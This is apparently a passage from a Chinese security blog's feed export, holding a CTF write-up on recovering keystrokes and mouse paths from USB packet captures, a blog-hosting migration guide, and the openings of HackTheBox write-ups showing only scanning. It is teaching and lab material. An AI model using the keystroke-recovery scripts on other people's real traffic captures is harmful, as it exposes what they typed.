class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">     <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">      <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">       <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">          <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
<p>运行第一个脚本得到<br><img src="https://img.npfs06.top/20210325160328.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BCFGIJGFEDCABACFEDCA7200[DEL]53[DEL]93</span><br><span class="line">因为[DEL]是删除键,恢复出6位数字。所以flag: 720593</span><br></pre></td></tr></table></figure>
<h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为<code>四个字节</code>。</p>
<blockquote>
<p>其中第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。<br>第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。<br>第三个字节与第二字节类似，代表垂直上下移动的偏移。</p>
</blockquote>
<p><img src="https://img.npfs06.top/20210325160345.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br>如图，数据信息为0x00002000，表示鼠标垂直向上移动20。</p>
<h3 id="题型：-1"><a href="#题型：-1" class="headerlink" title="题型："></a>题型：</h3><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag。</p>
<h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>1.使用kali linux中的tshark 命令把cap data提取出来，并去除空行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r usb2.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt #提取并去除空行</span><br></pre></td></tr></table></figure>
<p>2.根据usb协议鼠标数据还原鼠标移动轨迹，可写一个Python脚本进行快速还原。</p>
<h3 id="题目示例：-1"><a href="#题目示例：-1" class="headerlink" title="题目示例："></a>题目示例：</h3><p><a href="https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og">【NSCTF】这是一道鼠标流量分析题。</a><br>提取码：q6ro<br>（1）使用tshark 命令把pcap的数据提取并去除空行到<code>usbdata.txt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tshark -r usb2.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>（2）使用上面提到过的加冒号的脚本，并将脚本里提到的<code>16</code>改为<code>8</code>，得到</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python3 maohao.py</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210325160403.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br>（3）使用mouse.py测试信息隐藏位置</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> : <span class="comment"># 1 代表左键</span></span><br><span class="line">        f.write(<span class="built_in">str</span>(posx))</span><br><span class="line">        f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(posy))</span><br><span class="line">        f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>测试发现flag信息藏在右键中，即当脚本中btn_flag取2时可以得到一系列坐标<br><img src="https://img.npfs06.top/20210325160420.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br>（4）用gnuplot将<code>xy.txt</code>里的坐标转化成图像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gnuplot</span><br><span class="line"><span class="meta">gnuplot&gt;</span><span class="bash">plot <span class="string">&quot;xy.txt&quot;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210325160435.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">发现方向反了，使用windows上的”画图”垂直翻转一下即可。<br><img src="http://img.npfs06.top/20210325160454.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br>最终得到flag<br><img src="http://img.npfs06.top/20210325160505.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>参考 <a href="https://blog.csdn.net/qq_43625917/article/details/107723635" target="_blank">https://blog.csdn.net/qq_43625917/article/details/107723635</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title>dpwwn-01 LINUX 定时任务提权</title>
    <url>/2021/08/19/dpwwn-01-LINUX-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3cc42a43d0e22ec161bd07415819952262495611e74a854f23cde89b983a40f6"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>hexo-blog-encrypt输入密码无反应</title>
    <url>/2021/06/26/hexo-blog-encrypt%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%97%A0%E5%8F%8D%E5%BA%94/</url>
    <content><![CDATA[<p>通过hexp-blog-encrypt插件给hexo博客添加加密访问功能时遇到的问题及解决方案<a id="more"></a></p>
<p>很多时候，我们写的部分博客和文章是不希望别人看到的（比如一些情感相关的?），所以对这些文章进行加密，提供密码才能访问是个不错的方式。</p>
<p>Git Bash中输入命令行<code>npm install --save hexo-blog-encrypt</code>即可安装成功</p>
<p><strong>设置站点配置文件__config.yml：</strong></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">encrypt:</span></span><br><span class="line"><span class="symbol">    password:</span> <span class="number">123456</span> <span class="comment">//默认密码</span></span><br></pre></td></tr></table></figure>
<p>然后在文章的头部添加上对应的password字段</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">hexo-blog-encrypt输入密码无反应</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-06-26 19:42:22</span></span><br><span class="line"><span class="attr">updated:</span> <span class="number">2021-06-26 19:42:22</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">problems</span></span><br><span class="line"><span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<p>当我安装好，准备测试下的时候，发现输入密码页面没有反应。查找之后发现是浏览器不支持http输入密码，需要把http 访问改为https访问。网上的教程基本上都是让买https证书，但是我嫌麻烦….</p>
<hr>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>想到我的博客是Github搭建的，而github可以直接设置强制https，一切问题迎刃而解</p>
<p><img src="http://img.npfs06.top/20210626194934.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210626195012.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里勾上</p>
<blockquote>
<p>hexo clean </p>
<p>hexo g -d</p>
</blockquote>
<p>问题解决</p>
]]></content>
      <categories>
        <category>problems</category>
      </categories>
  </entry>
  <entry>
    <title>hexo博客从github迁移到阿里云服务器</title>
    <url>/2021/08/27/hexo%E5%8D%9A%E5%AE%A2%E4%BB%8Egithub%E8%BF%81%E7%A7%BB%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<p>npfs06.top 从建站以来静态页面都是同时托管在 <a href="https://link.zhihu.com/?target=https://pages.github.com/">GitHub Pages</a> 上，_config.yml 的 <code>deploy</code> 块如下<a id="more"></a></p>
<img src="http://img.npfs06.top/20210827095427.png" style="zoom:80%;">



<p>这是我之前的域名解析：</p>
<img src="http://img.npfs06.top/20210827095356.png" style="zoom:80%;">



<p>网站图床选择的是七牛云，也进行了cdn加速，按照我平时的图片使用量，每个月的费用是0.5元左右，所以图床不准备变更了</p>
<p>博客因为是基于github的，网页访问及其不稳定，比如：</p>
<ol>
<li><p>加载时间长</p>
</li>
<li><p>时不时抽筋无法访问</p>
</li>
</ol>
<p>所以决定将博客迁移到云服务器</p>
<p>云服务器配置如下：</p>
<img src="http://img.npfs06.top/20210827095831.png" style="zoom:80%;">

<hr>
<p>有了云服务器之后，建议ssh连上，省的每次登入都要输入账号密码（这里我用的是xshell）</p>
<h1 id="登录云服务器安装git和nginx"><a href="#登录云服务器安装git和nginx" class="headerlink" title="登录云服务器安装git和nginx"></a>登录云服务器安装git和nginx</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20210827100354.png" style="zoom:80%;">



<p>安装成功之后浏览器输入服务器ip地址打开是nginx默认页面</p>
<h1 id="修改默认打开页面"><a href="#修改默认打开页面" class="headerlink" title="修改默认打开页面"></a>修改默认打开页面</h1><p>nginx的默认界面是<code>/var/www/html</code></p>
<p><strong>也可不修改默认打开页面只需将博客文件放到/var/www/html下即可</strong></p>
<p>如果需要修改的话，找到nginx配置文件，我的是<code>/etc/nginx/sites-available</code>下的default文件，建议先备份</p>
<img src="http://img.npfs06.top/20210827100741.png" style="zoom:80%;">



<p>重新载入Nginx，使配置生效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure>


<p>如果报错，看看找对配置文件没，实在改不过来恢复原来的备份文件，执行命令后没什么显示即执行成功</p>
<h1 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h1><p><code>git clone https://github.com/npfs06/npfs06.github.io</code> 将github pages内容克隆到网站根目录</p>
<img src="http://img.npfs06.top/20210827100943.png" style="zoom:80%;">



<p>这个时候，我们即使没有备案，通过 IP 也可以访问自己的博客，可以直接在浏览器的地址栏输入阿里云公网的 IP 访问自己的博客。如果通过公网 IP 访问没有问题，说明环境搭建成功。</p>
<h1 id="域名访问"><a href="#域名访问" class="headerlink" title="域名访问"></a>域名访问</h1><p>如果有域名并已备案，在阿里云上控制台设置域名指向服务器的公网 IP 的 A 记录，这样就可以通过域名访问博客。</p>
<img src="http://img.npfs06.top/20210827101434.png" style="zoom:80%;">





<p>虽然看起来我们似乎将原来托管在 GitHub 或 Coding 上的博客迁移到阿里云服务器上了，但是博客源代码是通过手动 git clone 下来到 <code>/var/www/html/npfs06.github.io</code> 上的，如果我们需要对博客进行修改或者发布新的文章，运行 <code>hexo d</code>还是将会更新的博客源代码上传至 GitHub 或 Coding 上，并没有自动上传到阿里云的服务器上。如果想同步修改，还是需要在服务器的 <code>/var/www/html/npfs06.github.io</code> 目录下删除原来所有的博客源代码重新 git clone，或者通过 git pull 同步。</p>
<p>这是非常不方便的，因为博客的每一次修改都需要登上阿里云服务器手动同步，而我们期望的是能持续集成和部署。解决方法很简单，在阿里云的机器上搭建一个 Git 远程仓库（相对本地仓库来说），像 GitHub 一样，每次通过 <code>hexo d</code> 时候，也将网站内容更新到阿里云的 Git 仓库中，并自动同步到 <code>/var/www/html/npfs06.github.io</code> 中。</p>
<h1 id="创建一个Git裸库，只用于保存Repository信"><a href="#创建一个Git裸库，只用于保存Repository信" class="headerlink" title="创建一个Git裸库，只用于保存Repository信"></a>创建一个Git裸库，只用于保存Repository信</h1><p>创建 git 用户：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">adduser git</span></span><br></pre></td></tr></table></figure>
<p>在 /home/git 目录下创建裸仓 blog.git：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/home/git</span></span><br><span class="line">git init <span class="params">--bare</span> hexo.git</span><br></pre></td></tr></table></figure>
<p>修改 blog.git 的所有者和组权限：</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">chown -R g<span class="symbol">it:gi</span><span class="built_in">t</span> blog.git</span><br></pre></td></tr></table></figure>
<p>获取<strong>本地机器</strong> SSH 的公钥：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br></pre></td></tr></table></figure>
<p>复制公钥，将公钥写入阿里云机器的 /home/git/.ssh/authorized_keys 文件中</p>
<img src="http://img.npfs06.top/20210827102942.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20210827102120.png" style="zoom:80%;">



<p>在 /home/git/blog.git/hooks/post-receive 文件中写入：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">git --work-tree=/var/www/html/npfs06.github.io --git-dir=/home/git/blog.git checkout -f</span><br></pre></td></tr></table></figure>
<p>其中 npfs.06.github.io` 是我网站的文件名，这里需要换成你的网站文件名</p>
<p>修改<strong>本地机器</strong>上的 _config.yml 文件，在 <code>deploy</code> 块中添加<strong>阿里云机器</strong>上刚创建的 hexo.git 仓库：</p>
<img src="http://img.npfs06.top/20210827101715.png" style="zoom:80%;">

<p>其中 <code>47.96.160.180 </code>改为你的阿里云公网 IP 即可</p>
<p>这样就可以做到每次执行 <code>hexo d</code> 命令时，不仅将网站内容同步到 GitHub 或 Coding 上，同时也同步到阿里云机器的 <code>/var/www/html/npfs06.github.io</code> 目录中，做到自动化部署。</p>
<hr>
<p>接下来我们测试一下在本地将本篇文字push到github，看下服务器能否同步更新</p>
<p><code>hexo g -d</code></p>
<img src="http://img.npfs06.top/20210827102430.png" style="zoom:80%;">

<p>这里需要输入服务器登入密码， 如果服务器配置过SSH 公钥的，可以免密推送</p>
<p>可以看到网页上成功显示这篇文章</p>
<img src="http://img.npfs06.top/20210827102531.png" style="zoom:80%;">



<p>服务器上成功同步更新</p>
<img src="http://img.npfs06.top/20210827102625.png" style="zoom:80%;">





<hr>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>如果配置完成之后发现网页无法访问，可能是因为防火墙的443端口没有正确开启</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="params">--add-port=443/tcp</span> <span class="params">--permanent</span>   <span class="string">//</span>防火墙开启443端口</span><br><span class="line">firewall-cmd <span class="params">--reload</span>   <span class="string">//</span>重启</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title>htb-CozyHosting</title>
    <url>/2023/09/19/htb-CozyHosting/</url>
    <content><![CDATA[<p>htb-CozyHosting</p>
<a id="more"></a>

<p><img src="https://img.npfs06.top/20230919143339.png"></p>
<p>openvpn连上</p>
<p><img src="https://img.npfs06.top/20230919143612.png"></p>
<p>nmap扫描</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV -Pn <span class="number">10.10.11.230</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20230919143658.png"></p>
<p>开放了22和80端口，同时80端口指向<a href="http://cozyhosting.htb/">http://cozyhosting.htb</a></p>
<p>修改host文件</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-<span class="string">[~]</span></span><br><span class="line">└─# vim /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="number">10.10.11.230</span> cozyhosting.htb</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>hackthebox</category>
      </categories>
  </entry>
  <entry>
    <title>htb-backdoor</title>
    <url>/2022/04/05/htb-backdoor/</url>
    <content><![CDATA[<p>htb-backdoor</p>
<a id="more"></a>

<p>openvpn连上</p>
<img src="http://img.npfs06.top/20220331144754.png" style="zoom:80%;">



